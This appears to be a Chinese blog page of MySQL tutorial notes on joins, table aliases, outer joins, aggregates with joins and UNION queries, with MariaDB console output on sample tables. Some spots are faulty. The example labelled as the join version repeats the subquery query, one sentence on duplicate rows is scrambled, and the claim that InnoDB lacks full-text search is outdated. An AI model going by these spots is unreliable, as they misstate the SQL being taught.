性能考虑 MySQL在运行时关联指定的每个表以处理联结。这种处理可能是非常耗费资源的,因此应该仔细,不要联结不必要的表。联结的表越多,性能下降越厉害。 现在可以回顾一下前面章中的例子了。该例子如下所示 返回订购产品 TNT2 的客户列表 12345678MariaDB [test]&gt; select cust_name from customers where cust_id in (select cust_id from orders where order_num in (select order_num from orderitems where prod_id=&apos;TNT2&apos;));+----------------+| cust_name |+----------------+| Coyote Inc. || Yosemite Place |+----------------+2 rows in set (0.00 sec) 子查询并不总是执行复杂 SELECT 操作的最有效的方法,下面是使用联结的相同查询: 12345678MariaDB [test]&gt; select cust_name from customers where cust_id in (select cust_id from orders where order_num in (select order_num from orderitems where prod_id=&apos;TNT2&apos;));+----------------+| cust_name |+----------------+| Coyote Inc. || Yosemite Place |+----------------+2 rows in set (0.00 sec) 这个查询中返回数据需要使用3个表。但这里我们没有在嵌套子查询中使用它们,而是使用了两个联结。这里有3个 WHERE 子句条件。前两个关联联结中的表,后一个过滤产品 TNT2的数据。 多做实验 正如所见,为执行任一给定的SQL操作,一般存在不止一种方法。很少有绝对正确或绝对错误的方法。性能可能会受操作类型、表中数据量、是否存在索引或键以及其他一些条件的影响。因此,有必要对不同的选择机制进行实验,以找出最适合具体情况的方法。 小结 联结是SQL中最重要最强大的特性,有效地使用联结需要对关系数据库设计有基本的了解。本章随着对联结的介绍讲述了关系数据库设计的一些基本知识,包括等值联结(也称为内部联结)这种最经常使用的联结形式。下一章将介绍如何创建其他类型的联结。 创建高级联结本章将讲解另外一些联结类型(包括它们的含义和使用方法),介绍如何对被联结的表使用表别名和聚集函数。 使用表别名 前面章节中介绍了如何使用别名引用被检索的表列。给列起别名的语法如下: 检索出供应商的名字和国家，并以指定格式显示【vend_name(vend_country)】 123456789101112MariaDB [test]&gt; select concat(rtrim(vend_name),&apos;(&apos;,rtrim(vend_country),&apos;)&apos;) as vend_tile from vendors order by vend_name;+------------------------+| vend_tile |+------------------------+| ACME(USA) || Anvils R Us(USA) || Furball Inc.(USA) || Jet Set(England) || Jouets Et Ours(France) || LT Supplies(USA) |+------------------------+6 rows in set (0.00 sec) 别名除了用于列名和计算字段外, SQL还允许给表名起别名。这样做有两个主要理由: 缩短SQL语句; 允许在单条 SELECT 语句中多次使用相同的表。 请看下面的 SELECT 语句。它与前一章的例子中所用的语句基本相同,但改成了使用别名: 返回订购产品 TNT2 的客户列表 12345678MariaDB [test]&gt; select cust_name,cust_contact from customers as c,orders as o,orderitems as oi where c.cust_id = o.cust_id and oi.order_num = o.order_num and prod_id = &apos;TNT2&apos;;+----------------+--------------+| cust_name | cust_contact |+----------------+--------------+| Coyote Inc. | Y Lee || Yosemite Place | Y Sam |+----------------+--------------+2 rows in set (0.00 sec) 可以看到, FROM 子句中3个表全都具有别名。 customers AS c 建立 c 作为 customers 的别名,等等。这使得能使用省写的 c 而不是全名 customers 。在此例子中,表别名只用于 WHERE 子句。但是,表别名不仅能用于 WHERE 子句,它还可以用于 SELECT 的列表、 ORDER BY 子句以及语句的其他部分。 应该注意,表别名只在查询执行中使用。与列别名不一样,表别名不返回到客户机。 使用不同类型的联结 迄今为止,我们使用的只是称为内部联结或等值联结(equijoin)的简单联结。现在来看3种其他联结,它们分别是自联结、自然联结和外部联结。 1.自联结 如前所述,使用表别名的主要原因之一是能在单条 SELECT 语句中不止一次引用相同的表。下面举一个例子。 假如你发现某物品(其ID为 DTNTR )存在问题,因此想知道生产该物品的供应商生产的其他物品是否也存在这些问题。此查询要求首先找到生产ID为 DTNTR 的物品的供应商,然后找出这个供应商生产的其他物品。 下面是解决此问题的一种方法: 查找商品 prod_id =&apos;DTNTR&apos; 的供应商生产的商品名和id号prod_id,prod_name 12345678910111213MariaDB [test]&gt; select prod_id,prod_name from products where vend_id = (select vend_id from products where prod_id =&apos;DTNTR&apos;);+---------+----------------+| prod_id | prod_name |+---------+----------------+| DTNTR | Detonator || FB | Bird seed || FC | Carrots || SAFE | Safe || SLING | Sling || TNT1 | TNT (1 stick) || TNT2 | TNT (5 sticks) |+---------+----------------+7 rows in set (0.00 sec) 这是第一种解决方案,它使用了子查询。内部的 SELECT 语句做了一个 简单的检索 ,返回生产 IDprod_id为 DTNTR 的 物品供应商 的vend_id 。该ID用于外部查询的 WHERE 子句中,以便检索出这个供应商生产的所有物品 现在来看使用联结的相同查询: 12345678910111213MariaDB [test]&gt; select p1.prod_id,p1.prod_name from products as p1,products as p2 where p1.vend_id = p2.vend_id and p2.prod_id = &apos;DTNTR&apos;;+---------+----------------+| prod_id | prod_name |+---------+----------------+| DTNTR | Detonator || FB | Bird seed || FC | Carrots || SAFE | Safe || SLING | Sling || TNT1 | TNT (1 stick) || TNT2 | TNT (5 sticks) |+---------+----------------+7 rows in set (0.00 sec) 此查询中需要的两个表实际上是相同的表,因此 products 表在FROM 子句中出现了两次。虽然这是完全合法的,但对 products的引用具有二义性,因为MySQL不知道你引用的是 products 表中的哪个实例。 为解决此问题,使用了表别名。 products 的第一次出现为别名 p1 ,第二次出现为别名 p2。现在可以将这些别名用作表名。例如, SELECT语句使用 p1 前缀明确地给出所需列的全名。如果不这样,MySQL将返回错误,因为分别存在两个名为prod_id 、 prod_name 的列。MySQL不知道想要的是哪一个列(即使它们事实上是同一个列)。 WHERE (通过匹配 p1 中的 vend_id 和 p2 中的 vend_id )首先联结两个表,然后按第二个表中的prod_id 过滤数据,返回所需的数据。 用自联结而不用子查询 自联结通常作为外部语句用来替代从相同表中检索数据时使用的子查询语句。虽然最终的结果是相同的,但有时候处理联结远比处理子查询快得多。应该试一下两种方法,以确定哪一种的性能更好。 2.自然联结 无论何时对表进行联结,应该至少有一个列出现在不止一个表中(被联结的列)。标准的联结(前一章中介绍的内部联结)返回所有数据,甚至相同的列多次出现。自然联结排除多次出现,使每个列只返回一次。 怎样完成这项工作呢?答案是,系统不完成这项工作,由你自己完成它。自然联结是这样一种联结,其中你只能选择那些唯一的列。这一般是通过对表使用通配符( SELECT * ),对所有其他表的列使用明确的子集来完成的。下面举一个例子: 12345678MariaDB [test]&gt; select c.*,o.order_num,o.order_date,oi.prod_id,oi.quantity,oi.item_price from customers as c,orders as o,orderitems as oi where c.cust_id=o.cust_id and oi.order_num=o.order_num and prod_id=&apos;FB&apos;;+---------+-------------+----------------+-----------+------------+----------+--------------+--------------+-----------------+-----------+---------------------+---------+----------+------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email | order_num | order_date | prod_id | quantity | item_price |+---------+-------------+----------------+-----------+------------+----------+--------------+--------------+-----------------+-----------+---------------------+---------+----------+------------+| 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com | 20005 | 2005-09-01 00:00:00 | FB | 1 | 10.00 || 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com | 20009 | 2005-10-08 00:00:00 | FB | 1 | 10.00 |+---------+-------------+----------------+-----------+------------+----------+--------------+--------------+-----------------+-----------+---------------------+---------+----------+------------+2 rows in set (0.00 sec) 在这个例子中,通配符只对第一个表使用。所有其他列明确列出,所以没有重复的列被检索出来。 事实上,迄今为止我们建立的每个内部联结都是自然联结,很可能我们永远都不会用到不是自然联结的内部联结。 3.外部联结 许多联结将一个表中的行与另一个表中的行相关联。但有时候会需要包含没有关联行的那些行。例如,可能需要使用联结来完成以下工作: 对每个客户下了多少订单进行计数,包括那些至今尚未下订单的客户; 列出所有产品以及订购数量,包括没有人订购的产品; 计算平均销售规模,包括那些至今尚未下订单的客户。 在上述例子中,联结包含了那些在相关表中没有关联行的行。这种类型的联结称为外部联结。 下面的 SELECT 语句给出一个简单的内部联结。 它检索所有客户及其订单 1234567891011MariaDB [test]&gt; select customers.cust_id,orders.order_num from customers inner join orders on customers.cust_id=orders.cust_id;+---------+-----------+| cust_id | order_num |+---------+-----------+| 10001 | 20005 || 10001 | 20009 || 10003 | 20006 || 10004 | 20007 || 10005 | 20008 |+---------+-----------+5 rows in set (0.00 sec) 外部联结语法类似。为了检索所有客户,包括那些没有订单的客户,可如下进行: 123456789101112MariaDB [test]&gt; select customers.cust_id,orders.order_num from customers left outer join orders on customers.cust_id=orders.cust_id;+---------+-----------+| cust_id | order_num |+---------+-----------+| 10001 | 20005 || 10001 | 20009 || 10002 | NULL || 10003 | 20006 || 10004 | 20007 || 10005 | 20008 |+---------+-----------+6 rows in set (0.00 sec) 类似于上一章中所看到的内部联结,这条 SELECT 语句使用了关键字 OUTER JOIN 来指定联结的类型(而不是在 WHERE 子句中指定)。但是,与内部联结关联两个表中的行不同的是,外部联结还包括没有关联行的行。在使用 OUTER JOIN 语法时,必须使用 RIGHT 或 LEFT 关键字指定包括其所有行的表( RIGHT 指出的是 OUTER JOIN 右边的表,而 LEFT指出的是 OUTER JOIN 左边的表)。 上面的例子使用 LEFT OUTER JOIN 从 FROM子句的左边表( customers 表)中选择所有行。为了从右边的表中选择所有行,应该使用 RIGHT OUTER JOIN ,如下例所示: 1234567891011MariaDB [test]&gt; select customers.cust_id,orders.order_num from customers right outer join orders on orders.cust_id = customers.cust_id;+---------+-----------+| cust_id | order_num |+---------+-----------+| 10001 | 20005 || 10001 | 20009 || 10003 | 20006 || 10004 | 20007 || 10005 | 20008 |+---------+-----------+5 rows in set (0.00 sec) 没有 *= 操作符 MySQL不支持简化字符 *= 和 =* 的使用,这两种操作符在其他DBMS中是很流行的。 外部联结的类型 存在两种基本的外部联结形式:左外部联结和右外部联结。它们之间的唯一差别是所关联的表的顺序不同。换句话说,左外部联结可通过颠倒 FROM 或 WHERE 子句中表的顺序转换为右外部联结。因此,两种类型的外部联结可互换使用,而究竟使用哪一种纯粹是根据方便而定。 使用带聚集函数的联结 正如第12章所述,聚集函数用来汇总数据。虽然至今为止聚集函数的所有例子只是从单个表汇总数据,但这些函数也可以与联结一起使用。 为说明这一点,请看一个例子。 如果要检索所有客户及每个客户所下的订单数,下面使用了 COUNT() 函数的代码可完成此工作: 12345678910MariaDB [test]&gt; select customers.cust_name,customers.cust_id,count(orders.order_num) as num_ord from customers inner join orders on customers.cust_id = orders.cust_id group by customers.cust_id;+----------------+---------+---------+| cust_name | cust_id | num_ord |+----------------+---------+---------+| Coyote Inc. | 10001 | 2 || Wascals | 10003 | 1 || Yosemite Place | 10004 | 1 || E Fudd | 10005 | 1 |+----------------+---------+---------+4 rows in set (0.00 sec) 此SELECT 语句使用 INNER JOIN 将 customers 和 orders 表互相关联。GROUP BY 子句按客户分组数据,因此,函数调用 COUNT (orders.order_num)对每个客户的订单计数,将它作为 num_ord 返回。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697MariaDB [test]&gt; select * from customers;+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 10002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL || 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL |+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+5 rows in set (0.00 sec)MariaDB [test]&gt; select * from orders;+-----------+---------------------+---------+| order_num | order_date | cust_id |+-----------+---------------------+---------+| 20005 | 2005-09-01 00:00:00 | 10001 || 20006 | 2005-09-12 00:00:00 | 10003 || 20007 | 2005-09-30 00:00:00 | 10004 || 20008 | 2005-10-03 00:00:00 | 10005 || 20009 | 2005-10-08 00:00:00 | 10001 |+-----------+---------------------+---------+5 rows in set (0.00 sec)# 内部联结或等值联结(equijoin)的简单联结MariaDB [test]&gt; select orders.*,customers.* from customers inner join orders on customers.cust_id = orders.cust_id;+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| order_num | order_date | cust_id | cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| 20005 | 2005-09-01 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 20006 | 2005-09-12 00:00:00 | 10003 | 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 20007 | 2005-09-30 00:00:00 | 10004 | 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 20008 | 2005-10-03 00:00:00 | 10005 | 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 20009 | 2005-10-08 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+5 rows in set (0.00 sec)# 内部联结或等值联结(equijoin)的简单联结MariaDB [test]&gt; select orders.*,customers.* from orders inner join customers on customers.cust_id = orders.cust_id;+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| order_num | order_date | cust_id | cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| 20005 | 2005-09-01 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 20009 | 2005-10-08 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 20006 | 2005-09-12 00:00:00 | 10003 | 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 20007 | 2005-09-30 00:00:00 | 10004 | 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 20008 | 2005-10-03 00:00:00 | 10005 | 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+5 rows in set (0.00 sec)# 左外部联结MariaDB [test]&gt; select orders.*,customers.* from customers left outer join orders on customers.cust_id = orders.cust_id;+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| order_num | order_date | cust_id | cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| 20005 | 2005-09-01 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 20006 | 2005-09-12 00:00:00 | 10003 | 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 20007 | 2005-09-30 00:00:00 | 10004 | 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 20008 | 2005-10-03 00:00:00 | 10005 | 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 20009 | 2005-10-08 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || NULL | NULL | NULL | 10002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+6 rows in set (0.00 sec)# 左外部联结MariaDB [test]&gt; select orders.*,customers.* from orders left outer join customers on customers.cust_id = orders.cust_id;+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| order_num | order_date | cust_id | cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| 20005 | 2005-09-01 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 20006 | 2005-09-12 00:00:00 | 10003 | 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 20007 | 2005-09-30 00:00:00 | 10004 | 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 20008 | 2005-10-03 00:00:00 | 10005 | 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 20009 | 2005-10-08 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+5 rows in set (0.00 sec)# 右外部联结MariaDB [test]&gt; select orders.*,customers.* from customers right outer join orders on customers.cust_id = orders.cust_id;+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| order_num | order_date | cust_id | cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| 20005 | 2005-09-01 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 20006 | 2005-09-12 00:00:00 | 10003 | 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 20007 | 2005-09-30 00:00:00 | 10004 | 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 20008 | 2005-10-03 00:00:00 | 10005 | 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 20009 | 2005-10-08 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+5 rows in set (0.00 sec)# 右外部联结MariaDB [test]&gt; select orders.*,customers.* from orders right outer join customers on customers.cust_id = orders.cust_id;+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| order_num | order_date | cust_id | cust_id | cust_name | cust_address | cust_city | cust_state | cust_zip | cust_country | cust_contact | cust_email |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+| 20005 | 2005-09-01 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || 20006 | 2005-09-12 00:00:00 | 10003 | 10003 | Wascals | 1 Sunny Place | Muncie | IN | 42222 | USA | Jim Jones | rabbit@wascally.com || 20007 | 2005-09-30 00:00:00 | 10004 | 10004 | Yosemite Place | 829 Riverside Drive | Phoenix | AZ | 88888 | USA | Y Sam | sam@yosemite.com || 20008 | 2005-10-03 00:00:00 | 10005 | 10005 | E Fudd | 4545 53rd Street | Chicago | IL | 54545 | USA | E Fudd | NULL || 20009 | 2005-10-08 00:00:00 | 10001 | 10001 | Coyote Inc. | 200 Maple Lane | Detroit | MI | 44444 | USA | Y Lee | ylee@coyote.com || NULL | NULL | NULL | 10002 | Mouse House | 333 Fromage Lane | Columbus | OH | 43333 | USA | Jerry Mouse | NULL |+-----------+---------------------+---------+---------+----------------+---------------------+-----------+------------+----------+--------------+--------------+---------------------+6 rows in set (0.00 sec) 聚集函数也可以方便地与其他联结一起使用。请看下面的例子: 检索所有客户及每个客户所下的订单数(包括没有订单的客户) 1234567891011MariaDB [test]&gt; select customers.cust_name,customers.cust_id,count(orders.order_num) as num_ord from customers left outer join orders on customers.cust_id = orders.cust_id group by customers.cust_id;+----------------+---------+---------+| cust_name | cust_id | num_ord |+----------------+---------+---------+| Coyote Inc. | 10001 | 2 || Mouse House | 10002 | 0 || Wascals | 10003 | 1 || Yosemite Place | 10004 | 1 || E Fudd | 10005 | 1 |+----------------+---------+---------+5 rows in set (0.00 sec) 这个例子使用左外部联结来包含所有客户,甚至包含那些没有任何下订单的客户。结果显示也包含了客户 Mouse House ,它有 0 个订单。 使用联结和联结条件 在总结关于联结的这两章前,有必要汇总一下关于联结及其使用的某些要点。 注意所使用的联结类型。一般我们使用内部联结,但使用外部联结也是有效的。 保证使用正确的联结条件,否则将返回不正确的数据。 应该总是提供联结条件,否则会得出笛卡儿积。 在一个联结中可以包含多个表,甚至对于每个联结可以采用不同的联结类型。虽然这样做是合法的,一般也很有用,但应该在一起测试它们前,分别测试每个联结。这将使故障排除更为简单。 小结 本章是上一章关于联结的继续。本章从讲授如何以及为什么要使用别名开始,然后讨论不同的联结类型及对每种类型的联结使用的各种语法形式。我们还介绍了如何与联结一起使用聚集函数,以及在使用联结时应该注意的某些问题。 组合查询本章讲述如何利用 UNION 操作符将多条 SELECT 语句组合成一个结果集。 组合查询 多数SQL查询都只包含从一个或多个表中返回数据的单条 SELECT 语句。MySQL也允许执行多个查询(多条 SELECT 语句),并将结果作为单个查询结果集返回。这些组合查询通常称为并(union)或复合查询(compound query)。 有两种基本情况,其中需要使用组合查询: 在单个查询中从不同的表返回类似结构的数据; 对单个表执行多个查询,按单个查询返回数据。 组合查询和多个 WHERE 条件 多数情况下,组合相同表的两个查询完成的工作与具有多个 WHERE 子句条件的单条查询完成的工作相同。换句话说,任何具有多个 WHERE 子句的 SELECT 语句都可以作为一个组合查询给出,在以下段落中可以看到这一点。这两种技术在不同的查询中性能也不同。因此,应该试一下这两种技术,以确定对特定的查询哪一种性能更好。 创建组合查询 可用 UNION 操作符来组合数条SQL查询。利用 UNION ,可给出多条SELECT 语句,将它们的结果组合成单个结果集。 1.使用 UNION UNION 的使用很简单。所需做的只是给出每条 SELECT 语句,在各条语句之间放上关键字 UNION 。 举一个例子,假如需要价格小于等于 5 的所有物品的一个列表,而且还想包括供应商 1001 和 1002 生产的所有物品(不考虑价格)。 当然,可以利用 WHERE 子句来完成此工作,不过这次我们将使用 UNION 。正如所述,创建 UNION 涉及编写多条 SELECT 语句。首先来看单条语句: 12345678910111213141516171819202122MariaDB [test]&gt; select vend_id,prod_id,prod_price from products where prod_price &lt;=5;+---------+---------+------------+| vend_id | prod_id | prod_price |+---------+---------+------------+| 1003 | FC | 2.50 || 1002 | FU1 | 3.42 || 1003 | SLING | 4.49 || 1003 | TNT1 | 2.50 |+---------+---------+------------+4 rows in set (0.00 sec)MariaDB [test]&gt; select vend_id,prod_id,prod_price from products where vend_id in (1001,1002);+---------+---------+------------+| vend_id | prod_id | prod_price |+---------+---------+------------+| 1001 | ANV01 | 5.99 || 1001 | ANV02 | 9.99 || 1001 | ANV03 | 14.99 || 1002 | FU1 | 3.42 || 1002 | OL1 | 8.99 |+---------+---------+------------+5 rows in set (0.00 sec) 第一条 SELECT 检索价格不高于 5 的所有物品。第二条 SELECT 使用 IN 找出供应商 1001 和 1002 生产的所有物品。为了组合这两条语句,按如下进行: 1234567891011121314MariaDB [test]&gt; select vend_id,prod_id,prod_price from products where prod_price &lt;=5 union select vend_id,prod_id,prod_price from products where vend_id in (1001,1002);+---------+---------+------------+| vend_id | prod_id | prod_price |+---------+---------+------------+| 1003 | FC | 2.50 || 1002 | FU1 | 3.42 || 1003 | SLING | 4.49 || 1003 | TNT1 | 2.50 || 1001 | ANV01 | 5.99 || 1001 | ANV02 | 9.99 || 1001 | ANV03 | 14.99 || 1002 | OL1 | 8.99 |+---------+---------+------------+8 rows in set (0.00 sec) 这条语句由前面的两条 SELECT 语句组成,语句中用 UNION 关键字分隔。 UNION 指示MySQL执行两条 SELECT 语句,并把输出组合成单个查询结果集。 作为参考,这里给出使用多条 WHERE 子句而不是使用 UNION 的相同查询: 1234567891011121314MariaDB [test]&gt; select vend_id,prod_id,prod_price from products where prod_price &lt;=5 or vend_id in (1001,1002);+---------+---------+------------+| vend_id | prod_id | prod_price |+---------+---------+------------+| 1001 | ANV01 | 5.99 || 1001 | ANV02 | 9.99 || 1001 | ANV03 | 14.99 || 1003 | FC | 2.50 || 1002 | FU1 | 3.42 || 1002 | OL1 | 8.99 || 1003 | SLING | 4.49 || 1003 | TNT1 | 2.50 |+---------+---------+------------+8 rows in set (0.00 sec) 在这个简单的例子中,使用 UNION 可能比使用 WHERE 子句更为复杂。但对于更复杂的过滤条件,或者从多个表(而不是单个表)中检索数据的情形,使用 UNION 可能会使处理更简单。 检索客户信息表中客户名包含Mouse的客户id，以及订单表中，订单号为20005的客户id。 12345678MariaDB [test]&gt; select cust_id from orders where order_num=20005 union select cust_id from customers where cust_name regexp &apos;Mouse&apos;;+---------+| cust_id |+---------+| 10001 || 10002 |+---------+2 rows in set (0.00 sec)2.UNION 规则 正如所见,并是非常容易使用的。但在进行并时有几条规则需要注意。 UNION 必须由两条或两条以上的 SELECT 语句组成,语句之间用关键字 UNION 分隔(因此,如果组合4条 SELECT 语句,将要使用3个UNION 关键字)。 UNION 中的每个查询必须包含相同的列、表达式或聚集函数(不过各个列不需要以相同的次序列出)。 列数据类型必须兼容:类型不必完全相同,但必须是DBMS可以隐含地转换的类型(例如,不同的数值类型或不同的日期类型)。 如果遵守了这些基本规则或限制,则可以将并用于任何数据检索任务。 3.包含或取消重复的行 我们注意到,在分别执行时,第一条 SELECT 语句返回4行,第二条 SELECT 语句返回5行。但在用 UNION 组合两条 SELECT 语句后,只返回了8行而不是9行。 UNION 从查询结果集中自动去除了重复的行(换句话说,它的行为与。因为供应商 1002 生产单条 SELECT 语句中使用多个 WHERE 子句条件一样)的一种物品的价格也低于 5 ,所以两条 SELECT 语句都返回该行。在使用UNION 时,重复的行被自动取消。 这是 UNION 的默认行为,但是如果需要,可以改变它。事实上,如果想返回所有匹配行,可使用 UNION ALL 而不是 UNION 。 请看下面的例子: 123456789101112131415MariaDB [test]&gt; select vend_id,prod_id,prod_price from products where prod_price &lt;=5 union all select vend_id,prod_id,prod_price from products where vend_id in (1001,1002);+---------+---------+------------+| vend_id | prod_id | prod_price |+---------+---------+------------+| 1003 | FC | 2.50 || 1002 | FU1 | 3.42 || 1003 | SLING | 4.49 || 1003 | TNT1 | 2.50 || 1001 | ANV01 | 5.99 || 1001 | ANV02 | 9.99 || 1001 | ANV03 | 14.99 || 1002 | FU1 | 3.42 || 1002 | OL1 | 8.99 |+---------+---------+------------+9 rows in set (0.00 sec) 使用 UNION ALL ,MySQL不取消重复的行。因此这里的例子返回9行,其中有一行出现两次。 UNION 与 WHERE 本章开始时说过, UNION 几乎总是完成与多个WHERE 条件相同的工作。 UNION ALL 为 UNION 的一种形式,它完成WHERE 子句完成不了的工作。如果确实需要每个条件的匹配行全部出现(包括重复行),则必须使用 UNION ALL 而不是 WHERE 。 4.对组合查询结果排序 SELECT 语句的输出用 ORDER BY 子句排序。在用 UNION 组合查询时,只能使用一条 ORDER BY 子句,它必须出现在最后一条 SELECT 语句之后。对于结果集,不存在用一种方式排序一部分,而又用另一种方式排序另一部分的情况,因此不允许使用多条 ORDER BY 子句。 下面的例子排序前面 UNION 返回的结果: 123456789101112131415MariaDB [test]&gt; select vend_id,prod_id,prod_price from products where prod_price &lt;=5 union all select vend_id,prod_id,prod_price from products where vend_id in (1001,1002) order by vend_id,prod_price;+---------+---------+------------+| vend_id | prod_id | prod_price |+---------+---------+------------+| 1001 | ANV01 | 5.99 || 1001 | ANV02 | 9.99 || 1001 | ANV03 | 14.99 || 1002 | FU1 | 3.42 || 1002 | FU1 | 3.42 || 1002 | OL1 | 8.99 || 1003 | FC | 2.50 || 1003 | TNT1 | 2.50 || 1003 | SLING | 4.49 |+---------+---------+------------+9 rows in set (0.00 sec) 这条 UNION 在最后一条 SELECT 语句后使用了 ORDER BY 子句。虽然 ORDER BY 子句似乎只是最后一条 SELECT 语句的组成部分,但实际上MySQL将用它来排序所有 SELECT 语句返回的所有结果。 组合不同的表 为使表述比较简单,本章例子中的组合查询使用的均是相同的表。但是其中使用 UNION 的组合查询可以应用不同的表。 小结 本章讲授如何用 UNION 操作符来组合 SELECT 语句。利用 UNION ,可把多条查询的结果作为一条组合查询返回,不管它们的结果中包含还是不包含重复。使用 UNION 可极大地简化复杂的 WHERE 子句,简化从多个表中检索数据的工作。","link":"/2016/12/27/booboo_mysql/02-SQL01/"},{"title":"MySQL 管理课程 第四课 结构化查询语言SQL介绍和基本操作2","text":"全文本搜索本章将学习如何使用MySQL的全文本搜索功能进行高级的数据查询和选择。 理解全文本搜索 并非所有引擎都支持全文本搜索 MySQL支持几种基本的数据库引擎。并非所有的引擎都支持全文本搜索。两个最常使用的引擎为 MyISAM 和 InnoDB ,前者支持全文本搜索,而后者不支持。这就是为什么虽然本书中创建的多数样例表使用 InnoDB ,而有一个样例表( productnotes 表)却使用 MyISAM 的原因。如果你的应用中需要全文本搜索功能,应该记住这一点。 前面介绍了 LIKE 